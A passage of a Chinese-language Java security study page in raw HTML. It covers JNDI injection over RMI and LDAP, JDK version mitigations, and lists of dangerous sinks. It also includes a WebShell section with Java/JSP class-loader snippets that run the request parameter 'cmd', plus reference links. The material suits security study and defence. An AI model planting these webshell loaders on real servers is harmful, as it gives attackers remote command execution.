Reference</li>\n<li>LDAP</li>\n<li>Remote Location</li>\n<li>Remote Object</li>\n<li>RMI</li>\n<li>Serialized Object</li>\n</ul>\n<h3 id=\"rmi-remote-object\"><a class=\"anchor\" href=\"#rmi-remote-object\">#</a> RMI Remote Object</h3>\n<p>攻击者实现一个 RMI 恶意远程对象并绑定到 RMI Registry 上，将编译后的 RMI 远程对象类放在 HTTP/FTP/SMB 等服务器上。其中 Codebase 地址由远程服务器的  <code>java.rmi.server.codebase</code>  属性设置，供受害者的 RMI 客户端远程加载。</p>\n<p>利用条件如下：</p>\n<ul>\n<li>RMI 客户端的上下文环境允许访问远程 Codebase。</li>\n<li>属性  <code>java.rmi.server.useCodebaseOnly</code>  的值为 false。</li>\n</ul>\n<p>其中 JDK 6u45、7u21 后， <code>java.rmi.server.useCodebaseOnly</code>  的值默认为 true。</p>\n<h3 id=\"rmi-jndi-reference\"><a class=\"anchor\" href=\"#rmi-jndi-reference\">#</a> RMI + JNDI Reference</h3>\n<p>攻击者通过 RMI 服务返回一个 JNDI Naming Reference，受害者解码 Reference 时会去攻击者指定的远程地址加载 Factory 类。这种方式原理上并非使用 RMI Class Loading 机制，因此不受  <code>java.rmi.server.useCodebaseOnly</code>  系统属性的限制。但是在 JDK 6u132, JDK 7u122, JDK 8u113 后限制了 Naming/Directory 服务中 JNDI Reference 远程加载 Object Factory 类的特性。系统属性  <code>com.sun.jndi.rmi.object.trustURLCodebase</code>  、  <code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>  的默认值变为 false，即默认不允许从远程的 Codebase 加载 Reference 工厂类。</p>\n<h3 id=\"ldap-jndi-reference\"><a class=\"anchor\" href=\"#ldap-jndi-reference\">#</a> LDAP + JNDI Reference</h3>\n<p>Java 的 LDAP 可以在属性值中存储特定的 Java 对象，且 LDAP 服务的 Reference 远程加载 Factory 类不受  <code>com.sun.jndi.rmi.object.trustURLCodebase</code>  、 <code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>  等属性的限制，适用范围更广。</p>\n<h1 id=\"jdk-2\"><a class=\"anchor\" href=\"#jdk-2\">#</a> JDK</h1>\n<h2 id=\"jdk-8\"><a class=\"anchor\" href=\"#jdk-8\">#</a> JDK 8</h2>\n<ul>\n<li><code>sun.net.www.protocol</code>  不再支持 gopher 协议</li>\n</ul>\n<h3 id=\"8u251\"><a class=\"anchor\" href=\"#8u251\">#</a> 8u251</h3>\n<ul>\n<li>com.sun.org.apache.bcel.internal.util.ClassLoader 类被删除</li>\n</ul>\n<h3 id=\"8u191\"><a class=\"anchor\" href=\"#8u191\">#</a> 8u191</h3>\n<ul>\n<li>LDAP 远程 Reference 代码默认不信任，影响 LDAP 远程 Reference 代码攻击方式</li>\n</ul>\n<h3 id=\"8u121\"><a class=\"anchor\" href=\"#8u121\">#</a> 8u121</h3>\n<ul>\n<li>RMI 加入了反序列化白名单机制</li>\n<li>RMI 远程 Reference 代码默认不信任，影响 RMI 远程 Reference 代码攻击方式</li>\n</ul>\n<h3 id=\"8u113\"><a class=\"anchor\" href=\"#8u113\">#</a> 8u113</h3>\n<ul>\n<li><code>com.sun.jndi.rmi.object.trustURLCodebase</code>  默认为 false</li>\n<li><code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>  默认为 false</li>\n</ul>\n<h2 id=\"jdk-7\"><a class=\"anchor\" href=\"#jdk-7\">#</a> JDK 7</h2>\n<h3 id=\"7u201\"><a class=\"anchor\" href=\"#7u201\">#</a> 7u201</h3>\n<ul>\n<li>LDAP 远程 Reference 代码默认不信任，影响 LDAP 远程 Reference 代码攻击方式</li>\n</ul>\n<h3 id=\"7u122\"><a class=\"anchor\" href=\"#7u122\">#</a> 7u122</h3>\n<ul>\n<li><code>com.sun.jndi.rmi.object.trustURLCodebase</code>  默认为 false</li>\n<li><code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>  默认为 false</li>\n</ul>\n<h3 id=\"7u40\"><a class=\"anchor\" href=\"#7u40\">#</a> 7u40</h3>\n<ul>\n<li><code>java.io.File</code>  类中添加了  <code>isInvalid</code>  方法，检测文件名中是否包含空字节</li>\n</ul>\n<h2 id=\"jdk-6\"><a class=\"anchor\" href=\"#jdk-6\">#</a> JDK 6</h2>\n<h3 id=\"6u211\"><a class=\"anchor\" href=\"#6u211\">#</a> 6u211</h3>\n<ul>\n<li>LDAP 远程 Reference 代码默认不信任，影响 LDAP 远程 Reference 代码攻击方式</li>\n</ul>\n<h3 id=\"6u141\"><a class=\"anchor\" href=\"#6u141\">#</a> 6u141</h3>\n<ul>\n<li><code>com.sun.jndi.rmi.object.trustURLCodebase</code>  默认为 false</li>\n<li><code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>  默认为 false</li>\n</ul>\n<h3 id=\"6u45\"><a class=\"anchor\" href=\"#6u45\">#</a> 6u45</h3>\n<ul>\n<li>java.rmi.server.useCodebaseOnly 默认为 true，禁用自动加载远程类文件</li>\n</ul>\n<h1 id=\"常见sink\"><a class=\"anchor\" href=\"#常见sink\">#</a> 常见 Sink</h1>\n<h2 id=\"命令执行注入\"><a class=\"anchor\" href=\"#命令执行注入\">#</a> 命令执行 / 注入</h2>\n<ul>\n<li>java.lang.Runtime.getRuntime().exec()</li>\n<li>java.lang.ProcessBuilder</li>\n</ul>\n<h2 id=\"xxe\"><a class=\"anchor\" href=\"#xxe\">#</a> XXE</h2>\n<ul>\n<li>java.net.bull.javamelody.PayloadNameRequestWrapper</li>\n<li>javax.xml.bind.Unmarshaller</li>\n<li>javax.xml.parsers.DocumentBuilderFactory</li>\n<li>javax.xml.parsers.SAXParser</li>\n<li>javax.xml.stream.XMLStreamReader</li>\n<li>javax.xml.transform.sax.SAXSource</li>\n<li>javax.xml.transform.sax.SAXTransformerFactory</li>\n<li>javax.xml.transform.TransformerFactory</li>\n<li>javax.xml.validation.SchemaFactory</li>\n<li>javax.xml.validation.Validator</li>\n<li>javax.xml.xpath.XpathExpression</li>\n<li>org.apache.commons.digester3.Digester</li>\n<li>org.apache.ofbiz.base.util.UtilXml</li>\n<li>org.dom4j.io.SAXReader</li>\n<li>org.jdom.input.SAXBuilder</li>\n<li>org.jdom2.input.SAXBuilder</li>\n<li>org.xml.sax.helpers.XMLReaderFactory</li>\n<li>org.xml.sax.XMLReader</li>\n</ul>\n<h2 id=\"ssrf\"><a class=\"anchor\" href=\"#ssrf\">#</a> SSRF</h2>\n<ul>\n<li>HttpClient.execute</li>\n<li>HttpClients.execute</li>\n<li>HttpURLConnection.getInputStream</li>\n<li>ImageIO.read</li>\n<li>OkHttpClient.newCall.execute</li>\n<li>Request.Get.execute</li>\n<li>Request.Post.execute</li>\n<li>URL.openStream</li>\n<li>URLConnection.getInputStream</li>\n</ul>\n<h2 id=\"反序列化-2\"><a class=\"anchor\" href=\"#反序列化-2\">#</a> 反序列化</h2>\n<h3 id=\"相关sink函数\"><a class=\"anchor\" href=\"#相关sink函数\">#</a> 相关 Sink 函数</h3>\n<ul>\n<li><code>JSON.parseObject</code></li>\n<li><code>ObjectInputStream.readObject</code></li>\n<li><code>ObjectInputStream.readUnshared</code></li>\n<li><code>ObjectMapper.readValue</code></li>\n<li><code>XMLDecoder.readObject</code></li>\n<li><code>XStream.fromXML</code></li>\n<li><code>Yaml.load</code></li>\n</ul>\n<h3 id=\"magic-call\"><a class=\"anchor\" href=\"#magic-call\">#</a> Magic Call</h3>\n<p>以下的魔术方法都会在反序列化过程中被自动的调用。</p>\n<ul>\n<li><code>readObject</code></li>\n<li><code>readExternal</code></li>\n<li><code>readResolve</code></li>\n<li><code>readObjectNoData</code></li>\n<li><code>validateObject</code></li>\n<li><code>finalize</code></li>\n</ul>\n<h3 id=\"主流json库\"><a class=\"anchor\" href=\"#主流json库\">#</a> 主流 JSON 库</h3>\n<p>主流的 JSON 库有 Gson、Jackson、Fastjson 等，因为 JSON 常在反序列化中使用，所以相关库都有较大的影响。</p>\n<p>其中 Gson 默认只能反序列化基本类型，如果是复杂类型，需要程序员实现反序列化机制，相对比较安全。</p>\n<p>Jackson 除非指明 @jsonAutoDetect，Jackson 不会反序列化非 public 属性。在防御时，可以不使用 enableDefaultTyping 方法。相关 CVE 有 CVE-2017-7525、CVE-2017-15095。</p>\n<p>FastJson 是阿里巴巴的开源 JSON 解析库，支持将 Java Bean 序列化为 JSON 字符串，也支持从 JSON 字符串反序列化到 Java Bean，相关 CVE 有 CVE-2017-18349 等。</p>\n<p>FastJson 常见的 Sink 点有：</p>\n<ul>\n<li><code>JSON.toJSONString</code></li>\n<li><code>JSON.parseObject</code></li>\n<li><code>JSON.parse</code></li>\n</ul>\n<h1 id=\"webshell\"><a class=\"anchor\" href=\"#webshell\">#</a> WebShell</h1>\n<h2 id=\"bcel字节码\"><a class=\"anchor\" href=\"#bcel字节码\">#</a> BCEL 字节码</h2>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">String</span> bcelCode <span class=\"token operator\">=</span> <span class=\"token string\">\"...\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>response<span class=\"token punctuation\">.</span><span class=\"token function\">getOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">valueOf</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">ClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">loadClass</span><span class=\"token punctuation\">(</span>bcelCode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getConstructor</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span><span class=\"token function\">getParameter</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"cmd\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getBytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"自定义类加载器\"><a class=\"anchor\" href=\"#自定义类加载器\">#</a> 自定义类加载器</h2>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>response<span class=\"token punctuation\">.</span><span class=\"token function\">getOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">ClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> <span class=\"token function\">loadClass</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ClassNotFoundException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">.</span><span class=\"token function\">contains</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"shell\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token function\">findClass</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">loadClass</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> <span class=\"token function\">findClass</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ClassNotFoundException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> bytes <span class=\"token operator\">=</span> <span class=\"token class-name\">Base64</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDecoder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token class-name\">PermissionCollection</span> pc <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Permissions</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            pc<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">AllPermission</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token class-name\">ProtectionDomain</span> protectionDomain <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ProtectionDomain</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">CodeSource</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Certificate</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> pc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> bytes<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> bytes<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">,</span> protectionDomain<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">findClass</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">.</span><span class=\"token function\">loadClass</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"shell\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getConstructor</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span><span class=\"token function\">getParameter</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"cmd\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getBytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token operator\">%</span><span class=\"token operator\">></span></pre></td></tr></table></figure><h2 id=\"执行命令变式\"><a class=\"anchor\" href=\"#执行命令变式\">#</a> 执行命令变式</h2>\n<ul>\n<li>java.lang.ProcessBuilder#start</li>\n<li>java.lang.Runtime#exec</li>\n<li>TemplatesImpl</li>\n</ul>\n<h2 id=\"基于反射\"><a class=\"anchor\" href=\"#基于反射\">#</a> 基于反射</h2>\n<ul>\n<li>class.forName</li>\n<li>MethodAccessor.invoke</li>\n<li>Method.invoke</li>\n</ul>\n<h2 id=\"其他shell变式\"><a class=\"anchor\" href=\"#其他shell变式\">#</a> 其他 Shell 变式</h2>\n<ul>\n<li>java.beans.Expression</li>\n<li>java.lang.ClassLoader</li>\n<li>java.net.URLClassLoader</li>\n<li>jdk.nashorn.internal.runtime.ScriptLoader</li>\n<li>ObjectInputStream.resolveClass</li>\n<li>ScriptEngine.eval</li>\n<li>ScriptEngineManager</li>\n<li>ToolProvider.getSystemJavaCompiler</li>\n</ul>\n<h2 id=\"tomcat-容器\"><a class=\"anchor\" href=\"#tomcat-容器\">#</a> Tomcat 容器</h2>\n<ul>\n<li>Servlet</li>\n<li>Filter</li>\n<li>Listener</li>\n</ul>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<h2 id=\"官方文档\"><a class=\"anchor\" href=\"#官方文档\">#</a> 官方文档</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2NvbW1vbnMuYXBhY2hlLm9yZy9wcm9wZXIvY29tbW9ucy1vZ25sLw==\">ognl</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm9yYWNsZS5jb20vamF2YXNlLzkvc2VjdXJpdHkvdG9jLmh0bQ==\">Java SE Security Guide</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm9yYWNsZS5jb20vamF2YXNlLzcvZG9jcy90ZWNobm90ZXMvZ3VpZGVzL3JtaS9yZWxub3Rlcy5odG1s\">Java RMI Release Notes for JDK 6</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3JhY2xlLmNvbS90ZWNobmV0d29yay9qYXZhL2phdmFzZS83dTIxLXJlbG5vdGVzLTE5MzI4NzMuaHRtbA==\">Java Release Notes for JDK 7</span></li>\n</ul>\n<h2 id=\"机制说明\"><a class=\"anchor\" href=\"#机制说明\">#</a> 机制说明</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY3p3YmlnL3AvMTExMjcyMjIuaHRtbA==\">深入理解 Java 类加载</span></li>\n</ul>\n<h2 id=\"反序列化-3\"><a class=\"anchor\" href=\"#反序列化-3\">#</a> 反序列化</h2>\n<h3 id=\"标准\"><a class=\"anchor\" href=\"#标准\">#</a> 标准</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbGVudGJhbGFuY2V5aC9hcnRpY2xlL2RldGFpbHMvODE4Mzg0OQ==\">Java 序列化【草案一】</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm9yYWNsZS5jb20vZW4vamF2YS9qYXZhc2UvMTQvZG9jcy9zcGVjcy9zZXJpYWxpemF0aW9uL2luZGV4Lmh0bWw=\">Java 14 Object Serialization Specification</span></li>\n</ul>\n<h3 id=\"利用与技巧\"><a class=\"anchor\" href=\"#利用与技巧\">#</a> 利用与技巧</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvZnJvaG9mZjEvYXBwc2VjY2FsaS0yMDE1LW1hcnNoYWxsaW5nLXBpY2tsZXM=\">Marshalling Pickles how deserializing objects can ruin your day</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9mcm9ob2ZmLmdpdGh1Yi5pby9hcHBzZWNjYWxpLW1hcnNoYWxsaW5nLXBpY2tsZXMv\">AppSecCali 2015: Marshalling Pickles</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3dvdXRlci5jb2VrYWVydHMuYmUvMjAxNS9hbm5vdGF0aW9uaW52b2NhdGlvbmhhbmRsZXI=\">More serialization hacks with AnnotationInvocationHandler</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3B3bnRlc3Rlci9KUkU4dTIwX1JDRV9HYWRnZXQ=\">Pure JRE 8 RCE Deserialization gadget</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3NsaWdodGx5cmFuZG9tYnJva2VudGhvdWdodHMuYmxvZ3Nwb3QuY29tLzIwMTAvMDgvYnJlYWtpbmctZGVmZW5zaXZlLXNlcmlhbGl6YXRpb24uaHRtbA==\">Breaking Defensive Serialization</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3Mvbk5UdzNITW5rWDYzZDl5YmR4M1VTUQ==\">Java 反序列化漏洞从入门到深入</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNoYWl0aW4uY24vMjAxNS0xMS0xMV9qYXZhX3Vuc2VyaWFsaXplX3JjZS8=\">Java 反序列化漏洞通用利用分析</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mcmVlYnVmLmNvbS92dWxzLzE3NjY3Mi5odG1s\">JRE8u20 反序列化漏洞分析</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMzg0Nw==\">浅析 Java 序列化和反序列化</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZWN1cml0eS50ZW5jZW50LmNvbS9pbmRleC5waHAvYmxvZy9tc2cvOTc=\">Commons Collections Java 反序列化漏洞深入分析</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmJsYWNraGF0LmNvbS9ldS0xOS9XZWRuZXNkYXkvZXUtMTktQW4tRmFyLVNpZGVzLU9mLUphdmEtUmVtb3RlLVByb3RvY29scy5wZGY=\">FAR SIDES OF JAVA REMOTE PROTOCOLS</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvM2JKNjY4R1ZiMzluVDBORFZELTNJQQ==\">JDK8u20 反序列化漏洞新型 PoC 思路及具体实现</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cub3JhbmdlLnR3LzIwMTgvMDMvcHduLWN0Zi1wbGF0Zm9ybS13aXRoLWphdmEtanJtcC1nYWRnZXQuaHRtbA==\">Pwn a CTF Platform with Java JRMP Gadget</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3NlYy5vcmcvaG9tZS9kZXRhaWwvNDg0Ni5odG1s\">漫谈 JEP 290</span></li>\n</ul>\n<h3 id=\"框架-2\"><a class=\"anchor\" href=\"#框架-2\">#</a> 框架</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE2OTc3MC5odG1s\">WebLogic 反序列化漏洞漫谈</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jZXJ0LjM2MC5jbi9yZXBvcnQvZGV0YWlsP2lkPWM4ZWVkNGIzNmZlOGIxOWM1ODVhMTgxN2I1ZjEwYjll\">从 WebLogic 看反序列化漏洞的利用与防御</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NoZW5ncWkxNTgvZmFzdGpzb24tcmVtb3RlLWNvZGUtZXhlY3V0ZS1wb2MvYmxvYi9tYXN0ZXIvSmF2YV9KU09OJUU1JThGJThEJUU1JUJBJThGJUU1JTg4JTk3JUU1JThDJTk2JUU0JUI5JThCJUU2JUFFJTg3XyVFNyU5QyU4QiVFOSU5QiVBQSVFNSVBRSU4OSVFNSU4NSVBOCVFNSVCQyU4MCVFNSU4RiU5MSVFOCU4MCU4NSVFNSVCMyVCMCVFNCVCQyU5QS5wZGY=\">JSON 反序列化之殇</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3Mval9neDlDX3hMMUx5cm51RkZQRnNmZw==\">Shiro 组件漏洞与攻击链分析</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaW5mb3EuY29tL2FydGljbGVzL2FwYWNoZS1zaGlyby8=\">Application Security With Apache Shiro</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC81NDE3Njk1Ng==\">Shiro 安全框架【快速入门】</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xMzY3NzAy\">Shiro 实战 (四) - 过滤器机制</span></li>\n</ul>\n<h2 id=\"沙箱-2\"><a class=\"anchor\" href=\"#沙箱-2\">#</a> 沙箱</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3BocmFjay5vcmcvcGFwZXJzL2VzY2FwaW5nX3RoZV9qYXZhX3NhbmRib3guaHRtbA==\">Java Sandbox Escape</span></li>\n</ul>\n<h2 id=\"框架-3\"><a class=\"anchor\" href=\"#框架-3\">#</a> 框架</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FwYWNoZS9zdHJ1dHM=\">Struts</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FwYWNoZS9zdHJ1dHMtZXhhbXBsZXM=\">Struts Examples</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2VjbGlwc2UvamV0dHkucHJvamVjdA==\">Eclipse Jetty</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0xhbmRHcmV5L1NwcmluZ0Jvb3RWdWxFeHBsb2l0\">SpringBootVulExploit</span> SpringBoot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 checklist</li>\n</ul>\n<h3 id=\"框架利用技巧\"><a class=\"anchor\" href=\"#框架利用技巧\">#</a> 框架利用技巧</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYW5kZ3JleS5tZS9ibG9nLzIyLw==\">Spring Boot Fat Jar 写文件漏洞到稳定 RCE 的探索</span></li>\n</ul>\n<h2 id=\"rmi-2\"><a class=\"anchor\" href=\"#rmi-2\">#</a> RMI</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veWdqMDkzMC9wLzY1NDI4MTEuaHRtbA==\">Java RMI 与 RPC 的区别</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3JlaWxseS5jb20vbGlicmFyeS92aWV3L2xlYXJuaW5nLWphdmEvMTU2NTkyNzE4NC9jaDExczA0Lmh0bWw=\">Remote Method Invocation (RMI)</span></li>\n<li><span class=\"exturl\" 